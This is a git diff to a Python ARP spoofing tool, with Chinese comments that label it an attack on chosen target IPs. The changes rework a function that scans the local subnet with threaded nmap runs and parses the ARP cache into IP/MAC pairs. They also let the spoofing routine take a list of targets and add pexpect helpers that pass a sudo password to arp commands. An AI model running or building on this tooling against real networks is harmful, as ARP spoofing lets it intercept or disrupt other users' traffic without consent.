@@ -6,6 +6,7 @@ from threading import Thread
 
 
 import netifaces
+import pexpect
 from scapy.all import getmacbyip
 from scapy.all import sendp
 from scapy.all import send
@@ -49,7 +50,7 @@ def cach_ip(cmd, delay_time):
     p.kill()
 
 
-def get_ip_list():
+def get_ip_mac_dict():
     '''获取当前网关下所有ip与mac'''
 
     start_time = time.time()
@@ -68,7 +69,7 @@ def get_ip_list():
         nmap_cmd = "nmap %s" % nmap_ip
         print(nmap_cmd)
         nmap_threads.append(
-            Thread(target=cach_ip, args=(nmap_cmd, 5)))
+            Thread(target=cach_ip, args=(nmap_cmd, 3)))
 
     for thread in nmap_threads:
         thread.start()
@@ -80,12 +81,16 @@ def get_ip_list():
 
     print('***********************************************************')
     p = os.popen("arp -a")  # 获取arp缓存表
-    raw_info_list = p.read().split(' ')
-    # print(raw_info_list)
-    result_list = [item.strip('(').strip(')')
-                   for item in raw_info_list if '(' and ')' in item and item[1] != 'i']
-    print("ip地址获取成功，用时: ", time.time() - start_time)
-    return result_list
+    raw_info_list = p.read().split('\n')
+    filter_list = [item.split()
+                   for item in raw_info_list if "incomplete" not in item and len(item)]
+    ip_mac_dict = []
+    # for item in filter_list:
+    #     print(item)
+    for item in filter_list:
+        ip_mac_dict.append(
+            {"ip": item[1].strip('(').strip(')'), "mac": item[3]})
+    return ip_mac_dict
 
 
 async def attacker(arp, attack_time):
@@ -109,12 +114,13 @@ async def attacker_runner(tasks):
     await asyncio.gather(*tasks)
 
 
-def arpspoof(gateway_ip, self_ip, attack_time, *target_ip):
+def arpspoof(gateway_ip, self_ip, attack_time, target_ip):
     ''' ARP欺骗攻击
-    :param target_ip: 要攻击的ip
     :param gateway_ip: 要伪装成的ip
     :param self_ip: 本机ip
     :param attack_time: 攻击时长
+    :param target_ip: 要攻击的ip
+
     '''
 
     assert type(attack_time) == int, \
@@ -122,6 +128,7 @@ def arpspoof(gateway_ip, self_ip, attack_time, *target_ip):
 
     attacker_task = []
     for ip in target_ip:
+        print("target ip ", ip)
         self_mac = getmacbyip(self_ip)
         tgt_mac = getmacbyip(ip)
         # print("self_mac: ", self_mac)
@@ -133,6 +140,34 @@ def arpspoof(gateway_ip, self_ip, attack_time, *target_ip):
 
     asyncio.run(attacker_runner(attacker_task))
     return
+
+
+def check_local_password(password):
+    child = pexpect.spawn("sudo arp -a")
+    ret = child.expect(['Password:', ''])
+    if ret == 0:
+        print("ret == 0")
+        child.sendline(str(password))
+        check_result = child.expect(['Sorry, try again.'])
+        if check_result == 0:
+            return False
+        return True
+    elif ret == 1:
+        print("ret == 1")
+        return True
+    else:
+        print("something wrong")
+        return False
+
+
+def clear_arp_list(password):
+    routing_nicname = get_routing_nicname()
+    del_str = "sudo arp -d -i %s -a" % routing_nicname
+    child = pexpect.spawn(del_str)
+    ret = child.expect(["Password:"])
+    if ret == 0:
+        child.send(password)
+    # os.system(del_str)
 
 
 if __name__ == "__main__":
